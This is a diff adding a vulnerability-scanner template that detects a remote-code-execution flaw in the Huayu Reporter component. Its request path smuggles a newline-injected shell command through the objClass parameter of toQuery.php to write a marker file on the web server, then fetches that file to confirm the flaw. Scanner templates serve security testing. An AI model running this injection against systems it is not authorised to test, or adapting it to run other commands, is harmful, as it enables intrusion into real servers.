@@ -1,0 +1,21 @@
+id: huayu-Reporter-rce
+info:
+  author: Str1am
+  name: "\u534E\u57DFReporter\u7EC4\u4EF6 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C"
+  severity: high
+  tags: Reporter,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - f029ff010012ms
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27f029ff010012ms%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a'
+  - '{{BaseURL}}/view/Behavior/f029ff010012ms.txt'
